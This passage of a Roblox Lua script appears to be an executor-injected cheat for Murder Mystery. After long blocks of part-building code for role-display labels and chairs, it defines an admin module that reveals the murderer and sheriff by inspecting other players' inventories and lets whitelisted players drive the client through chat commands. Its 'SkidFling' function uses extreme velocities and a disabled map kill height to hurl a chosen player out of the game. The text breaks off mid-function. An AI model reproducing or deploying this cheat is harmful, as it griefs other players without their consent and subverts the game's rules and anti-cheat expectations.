			TextLabel85.TextWrapped = true
			Part86.Name = "Sheriff"
			Part86.Parent = Model0
			Part86.CFrame = CFrame.new(476.399994, 4909.56934, -176.399994, -1, 0, 0, 0, 1, 0, 0, 0, -1)
			Part86.Orientation = Vector3.new(0, 180, 0)
			Part86.Position = Vector3.new(476.3999938964844, 4909.5693359375, -176.39999389648438)
			Part86.Rotation = Vector3.new(180, 0, 180)
			Part86.Transparency = 1
			Part86.Size = Vector3.new(42.79998779296875, 41.1400032043457, 19.200000762939453)
			Part86.Anchored = true
			Part86.BottomSurface = Enum.SurfaceType.Smooth
			Part86.CanCollide = false
			Part86.TopSurface = Enum.SurfaceType.Smooth
			Part86.FormFactor = Enum.FormFactor.Custom
			Part86.formFactor = Enum.FormFactor.Custom
			SurfaceGui87.Parent = Part86
			TextLabel88.Parent = SurfaceGui87
			TextLabel88.Size = UDim2.new(1, 0, 1, 0)
			TextLabel88.BackgroundColor = BrickColor.new("Camo")
			TextLabel88.BackgroundColor3 = Color3.new(0.333333, 0.666667, 0)
			TextLabel88.BackgroundTransparency = 1
			TextLabel88.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
			TextLabel88.ClipsDescendants = true
			TextLabel88.Font = Enum.Font.ArialBold
			TextLabel88.FontSize = Enum.FontSize.Size14
			TextLabel88.Text = ""
			TextLabel88.TextColor = BrickColor.new("Tr. Blue")
			TextLabel88.TextColor3 = Color3.new(0.509804, 0.796079, 1)
			TextLabel88.TextSize = 14
			TextLabel88.TextWrap = true
			TextLabel88.TextWrapped = true
			TextLabel89.Parent = TextLabel88
			TextLabel89.Position = UDim2.new(0, 0, 0.400000006, 0)
			TextLabel89.Size = UDim2.new(1, 0, 0.200000003, 0)
			TextLabel89.BackgroundColor = BrickColor.new("Institutional white")
			TextLabel89.BackgroundColor3 = Color3.new(1, 1, 1)
			TextLabel89.BackgroundTransparency = 1
			TextLabel89.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
			TextLabel89.Font = Enum.Font.Unknown
			TextLabel89.FontSize = Enum.FontSize.Size48
			TextLabel89.Text = "Sheriff: NAN"
			TextLabel89.TextColor = BrickColor.new("Pastel blue-green")
			TextLabel89.TextColor3 = Color3.new(0.466667, 1, 0.937255)
			TextLabel89.TextScaled = true
			TextLabel89.TextSize = 48
			TextLabel89.TextWrap = true
			TextLabel89.TextWrapped = true
			Part90.Name = "Murder"
			Part90.Parent = Model0
			Part90.CFrame = CFrame.new(519.400024, 4909.56934, -176.399994, -1, 0, 0, 0, 1, 0, 0, 0, -1)
			Part90.Orientation = Vector3.new(0, 180, 0)
			Part90.Position = Vector3.new(519.4000244140625, 4909.5693359375, -176.39999389648438)
			Part90.Rotation = Vector3.new(180, 0, 180)
			Part90.Transparency = 1
			Part90.Size = Vector3.new(42.79998779296875, 41.1400032043457, 19.200000762939453)
			Part90.Anchored = true
			Part90.BottomSurface = Enum.SurfaceType.Smooth
			Part90.CanCollide = false
			Part90.TopSurface = Enum.SurfaceType.Smooth
			Part90.FormFactor = Enum.FormFactor.Custom
			Part90.formFactor = Enum.FormFactor.Custom
			SurfaceGui91.Parent = Part90
			TextLabel92.Parent = SurfaceGui91
			TextLabel92.Size = UDim2.new(1, 0, 1, 0)
			TextLabel92.BackgroundColor = BrickColor.new("Camo")
			TextLabel92.BackgroundColor3 = Color3.new(0.333333, 0.666667, 0)
			TextLabel92.BackgroundTransparency = 1
			TextLabel92.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
			TextLabel92.ClipsDescendants = true
			TextLabel92.Font = Enum.Font.ArialBold
			TextLabel92.FontSize = Enum.FontSize.Size14
			TextLabel92.Text = ""
			TextLabel92.TextColor = BrickColor.new("Tr. Blue")
			TextLabel92.TextColor3 = Color3.new(0.509804, 0.796079, 1)
			TextLabel92.TextSize = 14
			TextLabel92.TextWrap = true
			TextLabel92.TextWrapped = true
			TextLabel93.Parent = TextLabel92
			TextLabel93.Position = UDim2.new(0, 0, 0.400000006, 0)
			TextLabel93.Size = UDim2.new(1, 0, 0.200000003, 0)
			TextLabel93.BackgroundColor = BrickColor.new("Institutional white")
			TextLabel93.BackgroundColor3 = Color3.new(1, 1, 1)
			TextLabel93.BackgroundTransparency = 1
			TextLabel93.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
			TextLabel93.Font = Enum.Font.Unknown
			TextLabel93.FontSize = Enum.FontSize.Size48
			TextLabel93.Text = "Murder: NAN"
			TextLabel93.TextColor = BrickColor.new("Really red")
			TextLabel93.TextColor3 = Color3.new(1, 0, 0.0156863)
			TextLabel93.TextScaled = true
			TextLabel93.TextSize = 48
			TextLabel93.TextWrap = true
			TextLabel93.TextWrapped = true
			Model94.Name = "Chair"
			Model94.Parent = Model0
			Part95.Parent = Model94
			Part95.CFrame = CFrame.new(522.099976, 4896.1001, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part95.Orientation = Vector3.new(0, -90, 0)
			Part95.Position = Vector3.new(522.0999755859375, 4896.10009765625, -70.4217529296875)
			Part95.Rotation = Vector3.new(0, -90, 0)
			Part95.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part95.Size = Vector3.new(0.20000000298023224, 4.200000286102295, 0.20000000298023224)
			Part95.Anchored = true
			Part95.BrickColor = BrickColor.new("Brown")
			Part95.Material = Enum.Material.Wood
			Part95.brickColor = BrickColor.new("Brown")
			Part96.Parent = Model94
			Part96.CFrame = CFrame.new(520.099976, 4896.1001, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part96.Orientation = Vector3.new(0, -90, 0)
			Part96.Position = Vector3.new(520.0999755859375, 4896.10009765625, -70.4217529296875)
			Part96.Rotation = Vector3.new(0, -90, 0)
			Part96.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part96.Size = Vector3.new(0.20000000298023224, 4.200000286102295, 0.20000000298023224)
			Part96.Anchored = true
			Part96.BrickColor = BrickColor.new("Brown")
			Part96.Material = Enum.Material.Wood
			Part96.brickColor = BrickColor.new("Brown")
			Part97.Parent = Model94
			Part97.CFrame = CFrame.new(521.099976, 4898.1001, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part97.Orientation = Vector3.new(0, -90, 0)
			Part97.Position = Vector3.new(521.0999755859375, 4898.10009765625, -70.4217529296875)
			Part97.Rotation = Vector3.new(0, -90, 0)
			Part97.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part97.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 1.8000000715255737)
			Part97.Anchored = true
			Part97.BrickColor = BrickColor.new("Brown")
			Part97.Material = Enum.Material.Wood
			Part97.brickColor = BrickColor.new("Brown")
			Part98.Parent = Model94
			Part98.CFrame = CFrame.new(521.099976, 4897.30029, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part98.Orientation = Vector3.new(0, -90, 0)
			Part98.Position = Vector3.new(521.0999755859375, 4897.30029296875, -70.4217529296875)
			Part98.Rotation = Vector3.new(0, -90, 0)
			Part98.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part98.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 1.8000000715255737)
			Part98.Anchored = true
			Part98.BrickColor = BrickColor.new("Brown")
			Part98.Material = Enum.Material.Wood
			Part98.brickColor = BrickColor.new("Brown")
			Part99.Parent = Model94
			Part99.CFrame = CFrame.new(521.099976, 4897.7002, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part99.Orientation = Vector3.new(0, -90, 0)
			Part99.Position = Vector3.new(521.0999755859375, 4897.7001953125, -70.4217529296875)
			Part99.Rotation = Vector3.new(0, -90, 0)
			Part99.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part99.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 1.8000000715255737)
			Part99.Anchored = true
			Part99.BrickColor = BrickColor.new("Brown")
			Part99.Material = Enum.Material.Wood
			Part99.brickColor = BrickColor.new("Brown")
			Seat100.Parent = Model94
			Seat100.CFrame = CFrame.new(521.099976, 4895.7002, -71.0217514, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Seat100.Position = Vector3.new(521.0999755859375, 4895.7001953125, -71.0217514038086)
			Seat100.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Seat100.Transparency = 1
			Seat100.Size = Vector3.new(1.7999999523162842, 0.20000000298023224, 1)
			Seat100.Anchored = true
			Seat100.BrickColor = BrickColor.new("Brown")
			Seat100.Material = Enum.Material.Wood
			Seat100.TopSurface = Enum.SurfaceType.SmoothNoOutlines
			Seat100.brickColor = BrickColor.new("Brown")
			Part101.Parent = Model94
			Part101.CFrame = CFrame.new(521.099976, 4896.8999, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part101.Orientation = Vector3.new(0, -90, 0)
			Part101.Position = Vector3.new(521.0999755859375, 4896.89990234375, -70.4217529296875)
			Part101.Rotation = Vector3.new(0, -90, 0)
			Part101.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part101.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 1.8000000715255737)
			Part101.Anchored = true
			Part101.BrickColor = BrickColor.new("Brown")
			Part101.Material = Enum.Material.Wood
			Part101.brickColor = BrickColor.new("Brown")
			Part102.Parent = Model94
			Part102.CFrame = CFrame.new(522.099976, 4894.8999, -72.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part102.Orientation = Vector3.new(0, -90, 0)
			Part102.Position = Vector3.new(522.0999755859375, 4894.89990234375, -72.4217529296875)
			Part102.Rotation = Vector3.new(0, -90, 0)
			Part102.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part102.Size = Vector3.new(0.20000000298023224, 1.8000004291534424, 0.20000000298023224)
			Part102.Anchored = true
			Part102.BrickColor = BrickColor.new("Brown")
			Part102.Material = Enum.Material.Wood
			Part102.brickColor = BrickColor.new("Brown")
			Part103.Parent = Model94
			Part103.CFrame = CFrame.new(520.099976, 4894.8999, -72.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part103.Orientation = Vector3.new(0, -90, 0)
			Part103.Position = Vector3.new(520.0999755859375, 4894.89990234375, -72.4217529296875)
			Part103.Rotation = Vector3.new(0, -90, 0)
			Part103.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part103.Size = Vector3.new(0.20000000298023224, 1.8000004291534424, 0.20000000298023224)
			Part103.Anchored = true
			Part103.BrickColor = BrickColor.new("Brown")
			Part103.Material = Enum.Material.Wood
			Part103.brickColor = BrickColor.new("Brown")
			UnionOperation104.Parent = Model94
			UnionOperation104.CFrame = CFrame.new(521.099976, 4895.7002, -71.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			UnionOperation104.Orientation = Vector3.new(0, -90, 0)
			UnionOperation104.Position = Vector3.new(521.0999755859375, 4895.7001953125, -71.4217529296875)
			UnionOperation104.Rotation = Vector3.new(0, -90, 0)
			UnionOperation104.Color = Color3.new(0.486275, 0.360784, 0.27451)
			UnionOperation104.Size = Vector3.new(2.1999995708465576, 0.20000043511390686, 2.1999988555908203)
			UnionOperation104.Anchored = true
			UnionOperation104.BrickColor = BrickColor.new("Brown")
			UnionOperation104.Material = Enum.Material.Wood
			UnionOperation104.brickColor = BrickColor.new("Brown")
			UnionOperation104.UsePartColor = true
			Model105.Name = "Chair"
			Model105.Parent = Model0
			Part106.Parent = Model105
			Part106.CFrame = CFrame.new(531.099976, 4896.1001, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part106.Orientation = Vector3.new(0, -90, 0)
			Part106.Position = Vector3.new(531.0999755859375, 4896.10009765625, -70.4217529296875)
			Part106.Rotation = Vector3.new(0, -90, 0)
			Part106.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part106.Size = Vector3.new(0.20000000298023224, 4.200000286102295, 0.20000000298023224)
			Part106.Anchored = true
			Part106.BrickColor = BrickColor.new("Brown")
			Part106.Material = Enum.Material.Wood
			Part106.brickColor = BrickColor.new("Brown")
			Part107.Parent = Model105
			Part107.CFrame = CFrame.new(529.099976, 4896.1001, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part107.Orientation = Vector3.new(0, -90, 0)
			Part107.Position = Vector3.new(529.0999755859375, 4896.10009765625, -70.4217529296875)
			Part107.Rotation = Vector3.new(0, -90, 0)
			Part107.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part107.Size = Vector3.new(0.20000000298023224, 4.200000286102295, 0.20000000298023224)
			Part107.Anchored = true
			Part107.BrickColor = BrickColor.new("Brown")
			Part107.Material = Enum.Material.Wood
			Part107.brickColor = BrickColor.new("Brown")
			Part108.Parent = Model105
			Part108.CFrame = CFrame.new(530.099976, 4898.1001, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part108.Orientation = Vector3.new(0, -90, 0)
			Part108.Position = Vector3.new(530.0999755859375, 4898.10009765625, -70.4217529296875)
			Part108.Rotation = Vector3.new(0, -90, 0)
			Part108.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part108.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 1.8000000715255737)
			Part108.Anchored = true
			Part108.BrickColor = BrickColor.new("Brown")
			Part108.Material = Enum.Material.Wood
			Part108.brickColor = BrickColor.new("Brown")
			Part109.Parent = Model105
			Part109.CFrame = CFrame.new(530.099976, 4897.30029, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part109.Orientation = Vector3.new(0, -90, 0)
			Part109.Position = Vector3.new(530.0999755859375, 4897.30029296875, -70.4217529296875)
			Part109.Rotation = Vector3.new(0, -90, 0)
			Part109.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part109.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 1.8000000715255737)
			Part109.Anchored = true
			Part109.BrickColor = BrickColor.new("Brown")
			Part109.Material = Enum.Material.Wood
			Part109.brickColor = BrickColor.new("Brown")
			Part110.Parent = Model105
			Part110.CFrame = CFrame.new(530.099976, 4897.7002, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part110.Orientation = Vector3.new(0, -90, 0)
			Part110.Position = Vector3.new(530.0999755859375, 4897.7001953125, -70.4217529296875)
			Part110.Rotation = Vector3.new(0, -90, 0)
			Part110.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part110.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 1.8000000715255737)
			Part110.Anchored = true
			Part110.BrickColor = BrickColor.new("Brown")
			Part110.Material = Enum.Material.Wood
			Part110.brickColor = BrickColor.new("Brown")
			Seat111.Parent = Model105
			Seat111.CFrame = CFrame.new(530.099976, 4895.7002, -71.0217514, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Seat111.Position = Vector3.new(530.0999755859375, 4895.7001953125, -71.0217514038086)
			Seat111.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Seat111.Transparency = 1
			Seat111.Size = Vector3.new(1.7999999523162842, 0.20000000298023224, 1)
			Seat111.Anchored = true
			Seat111.BrickColor = BrickColor.new("Brown")
			Seat111.Material = Enum.Material.Wood
			Seat111.TopSurface = Enum.SurfaceType.SmoothNoOutlines
			Seat111.brickColor = BrickColor.new("Brown")
			Part112.Parent = Model105
			Part112.CFrame = CFrame.new(530.099976, 4896.8999, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part112.Orientation = Vector3.new(0, -90, 0)
			Part112.Position = Vector3.new(530.0999755859375, 4896.89990234375, -70.4217529296875)
			Part112.Rotation = Vector3.new(0, -90, 0)
			Part112.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part112.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 1.8000000715255737)
			Part112.Anchored = true
			Part112.BrickColor = BrickColor.new("Brown")
			Part112.Material = Enum.Material.Wood
			Part112.brickColor = BrickColor.new("Brown")
			Part113.Parent = Model105
			Part113.CFrame = CFrame.new(531.099976, 4894.8999, -72.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part113.Orientation = Vector3.new(0, -90, 0)
			Part113.Position = Vector3.new(531.0999755859375, 4894.89990234375, -72.4217529296875)
			Part113.Rotation = Vector3.new(0, -90, 0)
			Part113.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part113.Size = Vector3.new(0.20000000298023224, 1.8000004291534424, 0.20000000298023224)
			Part113.Anchored = true
			Part113.BrickColor = BrickColor.new("Brown")
			Part113.Material = Enum.Material.Wood
			Part113.brickColor = BrickColor.new("Brown")
			Part114.Parent = Model105
			Part114.CFrame = CFrame.new(529.099976, 4894.8999, -72.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part114.Orientation = Vector3.new(0, -90, 0)
			Part114.Position = Vector3.new(529.0999755859375, 4894.89990234375, -72.4217529296875)
			Part114.Rotation = Vector3.new(0, -90, 0)
			Part114.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part114.Size = Vector3.new(0.20000000298023224, 1.8000004291534424, 0.20000000298023224)
			Part114.Anchored = true
			Part114.BrickColor = BrickColor.new("Brown")
			Part114.Material = Enum.Material.Wood
			Part114.brickColor = BrickColor.new("Brown")
			UnionOperation115.Parent = Model105
			UnionOperation115.CFrame = CFrame.new(530.099976, 4895.7002, -71.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			UnionOperation115.Orientation = Vector3.new(0, -90, 0)
			UnionOperation115.Position = Vector3.new(530.0999755859375, 4895.7001953125, -71.4217529296875)
			UnionOperation115.Rotation = Vector3.new(0, -90, 0)
			UnionOperation115.Color = Color3.new(0.486275, 0.360784, 0.27451)
			UnionOperation115.Size = Vector3.new(2.1999995708465576, 0.20000043511390686, 2.1999988555908203)
			UnionOperation115.Anchored = true
			UnionOperation115.BrickColor = BrickColor.new("Brown")
			UnionOperation115.Material = Enum.Material.Wood
			UnionOperation115.brickColor = BrickColor.new("Brown")
			UnionOperation115.UsePartColor = true
			return Model0
		end

		function SafeZone:Destroy()
			if TheSafeZone then
				TheSafeZone:Destroy()
				TheSafeZone = nil
			end
		end

		return SafeZone

	end;
};
G2L_MODULES[G2L["1e1"]] = {
	Closure = function()
		local script = G2L["1e1"];
		-- MurderD0llanAdminModule
		-- Admin command system for local player, controlled by whilelisted players via .Chatted

		local Players = game:GetService("Players")
		local TextChatService = game:GetService("TextChatService")
		local LocalPlayer = Players.LocalPlayer

		local MurderD0llanAdminModule = {}

		local localplayer = game:GetService("Players").LocalPlayer
		local Players = game:GetService("Players")
		local playerData = {}

		local Notificaciones = {
			Error = "rbxassetid://4041673253",
			Aviso = "rbxassetid://4026367629",
			Correcto = "rbxassetid://4094488012",
		}


		local Notification_Service = require(script.Parent.Parent:FindFirstChild("NotificationService"))

		local function errornotify(text)
			Notification_Service.ShowNotification({
				title = "Error / MurderD0llan",
				text = text,
				soundOnOpen = Notificaciones.Error,
				theme = "Error"
			})
		end

		local function sucessnotify(text)
			Notification_Service.ShowNotification({
				title = "Success / MurderD0llan",
				text = text,
				soundOnOpen = Notificaciones.Correcto,
				theme = "Success"
			})
		end

		local function warningnotify(text)
			Notification_Service.ShowNotification({
				title = "Warning / MurderD0llan",
				text = text,
				soundOnOpen = Notificaciones.Aviso,
				theme = "Warning"
			})
		end


		local function GetTarget(Name: string)
			for i, v in pairs(Players:GetPlayers()) do
				if string.find(string.lower(v.Name), string.lower(Name)) then
					return v
				end
			end
		end

		-- Helpers
		local Help_Functions = {
			findMurderer = function()
				for _, i in ipairs(Players:GetPlayers()) do
					if i.Backpack:FindFirstChild("Knife") or (i.Character and i.Character:FindFirstChild("Knife")) or i.Backpack:FindFirstChild("knife") or (i.Character and i.Character:FindFirstChild("knife")) then
						return i
					end
				end
				for player, data in pairs(playerData) do
					if data.Role == "Murderer" and Players:FindFirstChild(player) then
						return Players:FindFirstChild(player)
					end
				end
				return nil
			end,

			findSheriff = function()
				for _, i in ipairs(Players:GetPlayers()) do
					if i.Backpack:FindFirstChild("Gun") or (i.Character and i.Character:FindFirstChild("Gun")) then
						return i
					end
				end
				for player, data in pairs(playerData) do
					if data.Role == "Sheriff" and Players:FindFirstChild(player) then
						return Players:FindFirstChild(player)
					end
				end
				return nil
			end,

			findSheriffThatsNotMe = function()
				for _, i in ipairs(Players:GetPlayers()) do
					if i ~= localplayer and (i.Backpack:FindFirstChild("Gun") or (i.Character and i.Character:FindFirstChild("Gun"))) then
						return i
					end
				end
				for player, data in pairs(playerData) do
					if data.Role == "Sheriff" and Players:FindFirstChild(player) and Players:FindFirstChild(player) ~= localplayer then
						return Players:FindFirstChild(player)
					end
				end
				return nil
			end,

			SkidFling = function(TargetPlayer)
				local Player = game:GetService("Players").LocalPlayer
				local Character = Player.Character
				local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
				local RootPart = Humanoid and Humanoid.RootPart

				if not TargetPlayer or not TargetPlayer.Character then
					errornotify("Target player is invalid or has no character.")
					return
				end

				local TCharacter = TargetPlayer.Character
				local THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
				local TRootPart = THumanoid and THumanoid.RootPart
				local THead = TCharacter:FindFirstChild("Head")
				local Accessory = TCharacter:FindFirstChildOfClass("Accessory")
				local Handle = Accessory and Accessory:FindFirstChild("Handle")

				if not Character or not Humanoid or not RootPart then
					errornotify("Your character is not fully loaded.")
					return
				end

				if not TCharacter:FindFirstChildWhichIsA("BasePart") then
					errornotify("Target player has no BasePart.")
					return
				end

				sucessnotify("Fling started on target: " .. TargetPlayer.Name)

				if RootPart.Velocity.Magnitude < 50 then
					getgenv().OldPos = RootPart.CFrame
				end

				if THead then
					workspace.CurrentCamera.CameraSubject = THead
				elseif Handle then
					workspace.CurrentCamera.CameraSubject = Handle
				elseif THumanoid and TRootPart then
					workspace.CurrentCamera.CameraSubject = THumanoid
				end

				local function FPos(BasePart, Pos, Ang)
					RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
					Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
					RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
					RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
				end

				local function SFBasePart(BasePart)
					local TimeToWait = 2
					local Time = tick()
					local Angle = 0

					repeat
						if RootPart and THumanoid then
							if BasePart.Velocity.Magnitude < 50 then
								Angle = Angle + 100

								FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
								task.wait()

								FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
								task.wait()

								FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
								task.wait()

								FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
								task.wait()
							else
								FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
								task.wait()
							end
						else
							break
						end
					until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
				end

				workspace.FallenPartsDestroyHeight = 0/0

				local BV = Instance.new("BodyVelocity")
				BV.Name = "EpixVel"
				BV.Parent = RootPart
				BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
				BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)

				Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

				if TRootPart and THead then
					if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
						SFBasePart(THead)
					else
						SFBasePart(TRootPart)
					end
				elseif TRootPart then
					SFBasePart(TRootPart)
				elseif THead then
					SFBasePart(THead)
				elseif Handle then
					SFBasePart(Handle)
				else
					errornotify("No valid fling target part found.")
				end

				BV:Destroy()
				Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
				workspace.CurrentCamera.CameraSubject = Humanoid

				repeat
					RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
					Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
					Humanoid:ChangeState("GettingUp")
					for _, x in ipairs(Character:GetChildren()) do
						if x:IsA("BasePart") then
							x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
						end
					end
					task.wait()
				until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25

				workspace.FallenPartsDestroyHeight = getgenv().FPDH

				sucessnotify("Fling finished successfully.")
			end
		}

		-- CONFIGURATION
		local COMMAND_PREFIX = "!" -- Changeable prefix for commands
		local WHISPER_CHANNEL = "RBXGeneral"
		local MAX_WHISPER_LENGTH = 200 -- Roblox whisper max length

		-- Private storage
		local whilelisted = {} -- [UserId] = Player
		local chattedConnections = {} -- [UserId] = RBXScriptConnection
		local commandCooldowns = {} -- [UserId][command] = lastUsedTimestamp
		local commandLog = {} -- { {timestamp, playerName, command, args} }

		-- Utility: split string by separator
		local function split(str, sep)
			local result = {}
			for word in string.gmatch(str, "[^"..sep.."]+") do
				table.insert(result, word)
			end
			return result
		end

		-- Utility: join table of strings with sep
		local function join(tbl, sep)
			local s = ""
			for i, v in tbl do
				if i > 1 then
					s = s .. sep
				end
				s = s .. tostring(v)
			end
			return s
		end

		-- Utility: send a whisper to a player (by name)
		local function whisperTo(playerName, message)
			local channel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild(WHISPER_CHANNEL)
			if not channel then return end
			-- Split message if too long
			local prefix = "/w " .. playerName .. " "
			local maxMsgLen = MAX_WHISPER_LENGTH - #prefix
			local messages = {}
			local msg = ""
			for word in string.gmatch(message, "[^ ]+") do
				if #msg + #word + 1 > maxMsgLen then
					table.insert(messages, msg)
					msg = word
				else
					if #msg > 0 then
						msg = msg .. " "
					end
					msg = msg .. word
				end
			end
			if #msg > 0 then
				table.insert(messages, msg)
			end
			for i, m in messages do
				channel:SendAsync(prefix .. m)
			end
		end

		-- Command registry
		commands = {
			--Custom Commands
			Murderer = {
				description = "find out who the murderer is",
				enabled = true,
				cooldown = 1,
				handler = function(args, fromPlayer)
					local Murderer = Help_Functions.findMurderer()
					if Murderer then
						whisperTo(fromPlayer.Name, "the murderer is: "..Murderer["Name"])
					else
						whisperTo(fromPlayer.Name, "no murderer has been detected")
					end
				end,
			},
			sheriff = {
				description = "find out who the sheriff is",
				enabled = true,
				cooldown = 1,
				handler = function(args, fromPlayer)
					local Sheriff = Help_Functions.findSheriff()
					if Sheriff then
						whisperTo(fromPlayer.Name, "the Sheriff is: "..Sheriff["Name"])
					else
						whisperTo(fromPlayer.Name, "no Sheriff has been detected")
					end
				end,
			},
			fling = {
				description = [[Flings a player by name (you can use "murderer" or "sheriff")]],
				enabled = true,
				cooldown = 2.5,
				handler = function(args, fromPlayer)
					if not args[1] then
						whisperTo(fromPlayer.Name, "You must provide a name or role (murderer/sheriff).")
						return false
					end

					local targetArg = string.lower(args[1])
					local targetPlayer

					if targetArg == "murderer" then
						targetPlayer = Help_Functions.findMurderer()
					elseif targetArg == "sheriff" then
						targetPlayer = Help_Functions.findSheriff()
					else
						targetPlayer = GetTarget(targetArg)
					end

					if not targetPlayer then
						whisperTo(fromPlayer.Name, "player not found")
						return false
					end

					-- Llamamos a la función de fling
					Help_Functions.SkidFling(targetPlayer)

					return true
				end
			},

			-- Built-in: cmds
			cancel = {
				description = "Removes yourself from the whilelist.",
				enabled = true,
				cooldown = 1,
				handler = function(args, fromPlayer)
					if whilelisted[fromPlayer.UserId] then
						MurderD0llanAdminModule.unwhilelist(fromPlayer)
						whisperTo(fromPlayer.Name, "You have been removed from the whilelist by your request.")
						return true
					else
						return false, "You are not whilelisted."
					end
				end
			},

			cmds = {
				description = "Lists all available commands.",
				enabled = true,
				cooldown = 2,
				handler = function(args, fromPlayer)
					-- List all enabled commands
					local available = {}
					for name, cmd in commands do
						if cmd.enabled then
							table.insert(available, name)
						end
					end
					table.sort(available)
					local msg = "Available commands: " .. join(available, ", ")
					-- Split into multiple whispers if needed
					whisperTo(fromPlayer.Name, msg)
					return true
				end
			}
			-- Add more commands here as needed
		}

		-- Command enable/disable API
		function MurderD0llanAdminModule.setCommandEnabled(cmdName, enabled)
			local cmd = commands[cmdName]
			if cmd then
				cmd.enabled = enabled and true or false
				return true
			end
			return false
		end

		-- Command log API
		function MurderD0llanAdminModule.getCommandLog()
			return commandLog
		end

		-- Helper: check cooldown
		local function isOnCooldown(userId, cmdName)
			if not commandCooldowns[userId] then
				commandCooldowns[userId] = {}
			end
			local last = commandCooldowns[userId][cmdName]
			local now = os.clock()
			local cd = commands[cmdName] and commands[cmdName].cooldown or 0
			if last and now - last < cd then
				return true, cd - (now - last)
			end
			commandCooldowns[userId][cmdName] = now
			return false
		end

		-- Handle .Chatted event from a whilelisted player
		local function onChatted(fromPlayer, msg)
			-- Check prefix
			if string.sub(msg, 1, #COMMAND_PREFIX) ~= COMMAND_PREFIX then
				return
			end
			local args = split(string.sub(msg, #COMMAND_PREFIX + 1), " ")
			local command = args[1] and string.lower(args[1])
			table.remove(args, 1)
			-- Logging
			table.insert(commandLog, {
				timestamp = os.time(),
				playerName = fromPlayer.Name,
				command = command,
				args = args
			})
			-- Check whilelist
			if not whilelisted[fromPlayer.UserId] then
